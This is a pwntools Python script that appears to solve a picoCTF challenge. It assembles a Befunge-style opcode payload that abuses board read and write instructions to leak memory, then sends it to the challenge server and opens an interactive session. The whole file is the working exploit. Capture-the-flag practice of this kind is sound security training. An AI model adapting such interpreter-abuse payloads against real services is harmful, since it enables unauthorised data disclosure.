from pwn import *

host = 'mars.picoctf.net'
port = 31689

r = remote(host, port);

direct_r = b'>'
direct_l = b'<'
direct_d = b'v'
push_zero = b'0'
putchar = b','
copy = b':'
add = b'+'
neg = b'!'
add2board = b'p'
endl = p8(0xa)
padd = b'a'
swap = b'\x5c'
add2stack = b'g'

asm50_on_stack = push_zero + neg + copy + add + copy * 4 + add * 4 + copy * 4 + add * 4 + direct_d
asm200_on_stack = direct_l + push_zero * 2 + add2board + push_zero * 2 + add2stack + copy * 4 + add * 4 + push_zero * 2 + add2stack + push_zero + neg + direct_d
asm4_and_swap_stack = direct_r + (copy + add) * 2 + swap + add2board + push_zero + padd * 12 + direct_d
getchar = direct_l + copy + push_zero * 2 + add2stack + add2stack + putchar + push_zero + neg + add + padd * 11

payload = asm50_on_stack + endl + asm200_on_stack[::-1] + endl + asm4_and_swap_stack + endl + getchar[::-1] + endl

print(f'[+] Payload assembled : {payload}')

r.recvuntil(b'Enter homework sol')

r.sendline(payload)

r.interactive()
